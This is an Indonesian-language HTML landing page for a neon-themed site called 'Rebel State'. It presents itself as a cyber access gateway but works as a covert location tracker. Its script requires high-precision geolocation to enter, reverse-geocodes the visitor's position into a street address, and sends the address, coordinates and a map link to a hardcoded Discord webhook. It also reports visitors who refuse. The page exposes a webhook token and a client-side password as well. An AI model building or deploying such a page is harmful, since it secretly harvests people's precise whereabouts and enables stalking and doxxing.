<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>REBEL STATE - NEON ACCESS POINT</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- SweetAlert2 untuk notifikasi dan prompt kata sandi -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;900&display=swap" rel="stylesheet">
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">

    <style>
        /* --- TEMA NEON PINK & BLACK --- */
        :root {
            --neon-pink: #ff2d95; /* Pink Neon Utama */
            --neon-purple: #bc13fe; /* Ungu Neon Aksen */
            --bg-black: #050505; /* Hitam Pekat */
            --text-glow: 0 0 10px rgba(255, 45, 149, 0.8);
        }
        
        /* Konfigurasi Dasar dan Font */
        body {
            font-family: 'Poppins', sans-serif;
            background: radial-gradient(circle at center, #1a0b16 0%, var(--bg-black) 100%);
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Container Splash dengan sentuhan Neon */
        .splash-container {
            position: relative;
            background: rgba(10, 10, 10, 0.8);
            backdrop-filter: blur(15px);
            padding: 40px;
            text-align: center;
            border-radius: 24px;
            max-width: 500px;
            width: 90%;
            z-index: 10;
            border: 2px solid var(--neon-pink);
            box-shadow: 0 0 20px rgba(255, 45, 149, 0.3), inset 0 0 15px rgba(255, 45, 149, 0.2);
        }

        .title-text {
            font-size: 3.5rem;
            font-weight: 900;
            color: #fff;
            margin-bottom: 20px;
            text-transform: uppercase;
            /* Efek Neon Glow Pink & Purple */
            text-shadow: 0 0 5px #fff, 0 0 10px var(--neon-pink), 0 0 20px var(--neon-pink), 0 0 40px var(--neon-purple);
            font-style: italic;
            letter-spacing: 4px;
        }

        /* CTA Button Styling Neon */
        .cta-button {
            display: inline-block;
            background: transparent;
            color: var(--neon-pink);
            padding: 15px 50px;
            border: 2px solid var(--neon-pink);
            border-radius: 12px;
            font-size: 1.25rem;
            font-weight: 800;
            text-transform: uppercase;
            text-decoration: none;
            margin-top: 30px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: 0 0 10px rgba(255, 45, 149, 0.4);
            letter-spacing: 3px;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
            position: relative;
            overflow: hidden;
        }

        .cta-button:hover:not(:disabled) {
            background-color: var(--neon-pink);
            color: #000;
            box-shadow: 0 0 30px var(--neon-pink);
            transform: scale(1.05);
        }

        .cta-button:disabled {
            cursor: not-allowed;
            opacity: 0.3;
            border-color: #333;
            color: #333;
            box-shadow: none;
        }
        
        @media (max-width: 600px) {
            .title-text { font-size: 2.5rem; }
            .cta-button { font-size: 1rem; padding: 12px 30px; }
        }

        /* --- EFEK PARTIKEL NEON --- */
        .snowflake {
            position: absolute;
            width: 4px;
            height: 4px;
            background: var(--neon-pink);
            border-radius: 50%;
            pointer-events: none;
            opacity: 0.6;
            box-shadow: 0 0 8px var(--neon-pink);
            z-index: 5;
        }
        
        @keyframes fall {
            to { transform: translateY(100vh); opacity: 0; }
        }

        /* Spinner kustom Neon */
        .custom-loader {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: var(--neon-pink);
            border-bottom-color: var(--neon-purple);
            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
            margin: 20px auto;
            box-shadow: 0 0 15px var(--neon-pink);
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* SweetAlert Custom Theme Override */
        .swal2-popup-neon {
            border: 2px solid var(--neon-pink) !important;
            box-shadow: 0 0 25px rgba(255, 45, 149, 0.5) !important;
        }
    </style>
</head>
<body>
    <!-- Layer Partikel Neon -->
    <div id="snow-container" class="fixed inset-0 overflow-hidden pointer-events-none"></div>

    <div class="splash-container" data-aos="fade-in" data-aos-duration="1500">
        <div class="w-24 h-24 mx-auto mb-6 relative">
            <!-- Glow effect behind logo -->
            <div class="absolute inset-0 bg-pink-500 rounded-full blur-xl opacity-30 animate-pulse"></div>
            <img src="web rebel/image.png"
                onerror="this.onerror=null; this.src='https://placehold.co/100x100/ff2d95/000000?text=REBEL';"
                alt="Rebel Logo"
                class="relative w-full h-full rounded-full border-2 border-[var(--neon-pink)] object-cover shadow-[0_0_20px_var(--neon-pink)]">
        </div>
        
        <h1 class="title-text">REBEL STATE</h1>
        <p class="text-sm text-pink-400 tracking-[0.3em] font-mono opacity-80" data-aos="fade-up" data-aos-delay="200">
            [ CYBER ACCESS GATEWAY ]
        </p>

        <button 
            id="enter-button" 
            class="cta-button" 
            data-aos="zoom-in" 
            data-aos-delay="500"
            onclick="enterSite()">
            ENTER CITY
        </button>

        <p id="status-message" class="mt-8 text-[10px] text-gray-500 font-mono tracking-widest uppercase transition-colors duration-300">
            Neon Systems Online. Click to Authenticate.
        </p>
    </div>
    
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>
        AOS.init();

        // --- KONFIGURASI WEBHOOK DISCORD ---
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1454949858220838997/W0Im6459m3P4hwnqp0JtoZOVNWU8KsLEgm0NWi1K2-yZriJrtvlVtM-BOJbRCEHTPm8x";

        let isLocationAuthorized = false;
        let isProcessing = false;

        // --- EFEK PARTIKEL NEON ---
        const snowContainer = document.getElementById('snow-container');
        const NUM_SNOWFLAKES = 40;
        function createSnowflake() {
            const snowflake = document.createElement('div');
            snowflake.classList.add('snowflake');
            const startX = Math.random() * 100; 
            const size = Math.random() * 3 + 2; 
            const duration = Math.random() * 5 + 5; 
            const delay = Math.random() * 5; 
            snowflake.style.left = `${startX}vw`;
            snowflake.style.width = `${size}px`;
            snowflake.style.height = `${size}px`;
            snowflake.style.background = Math.random() > 0.5 ? '#ff2d95' : '#bc13fe';
            snowflake.style.animation = `fall ${duration}s linear infinite`;
            snowflake.style.animationDelay = `${delay}s`;
            snowContainer.appendChild(snowflake);
        }
        for (let i = 0; i < NUM_SNOWFLAKES; i++) { createSnowflake(); }

        // --- SISTEM KEAMANAN & LOKASI ---
        const ACCESS_PASSWORD = 'rebelcity';
        const enterButton = document.getElementById('enter-button');
        const statusMessage = document.getElementById('status-message');

        function requestInitialLocation() {
            if (!navigator.geolocation) return;
            navigator.geolocation.getCurrentPosition(
                () => { isLocationAuthorized = true; },
                () => { isLocationAuthorized = false; },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        function sendDenyReportToDiscord() {
            const timestamp = new Date().toLocaleString('id-ID');
            const payload = {
                embeds: [{
                    title: "âš ï¸ Upaya Masuk: Izin Lokasi Ditolak",
                    description: "Seorang pengguna mencoba masuk ke Rebel State tetapi menolak memberikan akses lokasi.",
                    color: 16723097, // Pink Neon
                    fields: [
                        { name: "â° Waktu", value: timestamp },
                        { name: "ðŸ›¡ï¸ Status", value: "Akses Dibatalkan oleh Sistem (Izin Ditolak)" }
                    ],
                    footer: { text: "Rebel State Neon Security" }
                }]
            };
            fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
        }

        async function trackAndFetchDetails() {
            return new Promise((resolve, reject) => {
                const highPrecisionOptions = { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 };
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    const timestamp = new Date().toLocaleString('id-ID');
                    const isLowAcc = accuracy > 1000;
                    
                    let address = "Lokasi tidak teridentifikasi";
                    try {
                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18`, {
                            headers: { 'Accept-Language': 'id' }
                        });
                        const data = await response.json();
                        address = data.display_name || address;
                    } catch (e) {}

                    const qualityText = isLowAcc ? "âš ï¸ Rendah (Internet IP)" : "ðŸŽ¯ Kuat (GPS Presisi)";
                    const payload = {
                        embeds: [{
                            title: "ðŸš¨ Akses City Baru: " + (isLowAcc ? "Estimasi IP" : "GPS Presisi"),
                            color: isLowAcc ? 16733590 : 16723097,
                            fields: [
                                { name: "ðŸ  Alamat Lengkap", value: address },
                                { name: "ðŸŒ Koordinat", value: `\`${latitude}, ${longitude}\``, inline: true },
                                { name: "ðŸŽ¯ Kualitas Sinyal", value: `${Math.round(accuracy)}m - ${qualityText}`, inline: true },
                                { name: "â° Waktu", value: timestamp },
                                { name: "ðŸ—ºï¸ Navigasi", value: `[Buka Maps](https://www.google.com/maps?q=${latitude},${longitude})` }
                            ],
                            footer: { text: "Rebel State Neon High Precision" }
                        }]
                    };
                    fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
                    resolve(address);
                }, (error) => {
                    sendDenyReportToDiscord();
                    reject(error);
                }, highPrecisionOptions);
            });
        }

        async function proceedToSite() {
            Swal.fire({
                title: 'MOHON TUNGGU SEBENTAR',
                html: `
                    <div class="mt-4">
                        <div class="custom-loader"></div>
                        <p class="text-xs text-pink-400 italic font-mono">Sedang mengunci sinyal satelit untuk verifikasi akses...</p>
                    </div>
                `,
                background: '#0a0a0a',
                color: '#ff2d95',
                allowOutsideClick: false,
                showConfirmButton: false,
                customClass: { popup: 'swal2-popup-neon' },
                didOpen: () => { Swal.showLoading(); }
            });

            try {
                const userAddress = await trackAndFetchDetails();
                Swal.fire({
                    title: 'ACCESS GRANTED!',
                    html: `
                        <div class="text-sm mt-4 font-mono">
                            Mengarahkan ke Kota Rebel State...<br><br>
                            <b class="text-white">Kamu tinggal di:</b><br>
                            <span class="text-pink-400 italic">${userAddress}</span>
                        </div>
                    `,
                    icon: 'success',
                    background: '#0a0a0a',
                    color: '#fff',
                    timer: 3000, 
                    timerProgressBar: true,
                    showConfirmButton: false,
                    customClass: { popup: 'swal2-popup-neon' },
                    didOpen: () => {
                        setTimeout(() => { window.location.href = "web rebel/pertama.html"; }, 3000);
                    }
                });
            } catch (err) {
                isProcessing = false;
                Swal.fire({
                    title: 'AKSES GAGAL',
                    text: 'Maaf kami tidak bisa melacak mu karena kamu tidak mengizinkan.',
                    icon: 'error',
                    background: '#0a0a0a',
                    color: '#ff2d95',
                    confirmButtonColor: '#ff2d95',
                    customClass: { popup: 'swal2-popup-neon' }
                });
            }
        }

        function promptForPassword() {
            Swal.fire({
                title: 'SYSTEM AUTHENTICATION',
                html: `<p class="text-[10px] mt-2 text-pink-200/50 uppercase tracking-widest font-mono">Restricted Access (00:00 - 08:00).<br>Enter Cyber City Code.</p>`,
                input: 'password',
                inputPlaceholder: 'Enter Security Code',
                showCancelButton: true,
                confirmButtonText: 'Access',
                background: '#0a0a0a',
                color: '#fff',
                customClass: { 
                    popup: 'swal2-popup-neon',
                    input: 'bg-black text-pink-500 border-pink-500 focus:ring-pink-500' 
                }
            }).then((result) => {
                if (result.isConfirmed) {
                    if (result.value === ACCESS_PASSWORD) {
                        proceedToSite();
                    } else {
                        isProcessing = false;
                        Swal.fire({ title: 'KODE SALAH', text: 'Akses ditolak. Coba lagi.', icon: 'error', timer: 2000, showConfirmButton: false, background: '#0a0a0a', color: '#ff2d95', customClass: { popup: 'swal2-popup-neon' } });
                    }
                } else {
                    isProcessing = false;
                }
            });
        }

        window.enterSite = function() {
            if (isProcessing) {
                Swal.fire({ title: 'TUNGGU SEBENTAR', text: 'Jangan di spam, ini sedang proses...', icon: 'info', background: '#0a0a0a', color: '#ff2d95', timer: 2000, showConfirmButton: false, customClass: { popup: 'swal2-popup-neon' } });
                return;
            }
            isProcessing = true;

            if (!isLocationAuthorized) {
                navigator.geolocation.getCurrentPosition(
                    () => { isLocationAuthorized = true; executeEntryLogic(); },
                    () => {
                        sendDenyReportToDiscord();
                        isProcessing = false;
                        Swal.fire({ title: 'AKSES DITOLAK', text: 'Maaf kami tidak bisa melacak mu karena kamu tidak mengizinkan.', icon: 'warning', background: '#0a0a0a', color: '#ff2d95', confirmButtonColor: '#ff2d95', customClass: { popup: 'swal2-popup-neon' } });
                    },
                    { enableHighAccuracy: true, maximumAge: 0 }
                );
                return;
            }
            executeEntryLogic();
        }

        function executeEntryLogic() {
            const now = new Date();
            const currentHour = now.getHours();
            const isRestricted = currentHour >= 0 && currentHour <= 8;
            if (isRestricted) { promptForPassword(); } else { proceedToSite(); }
        }

        document.addEventListener('DOMContentLoaded', () => { requestInitialLocation(); });
    </script>
</body>
</html>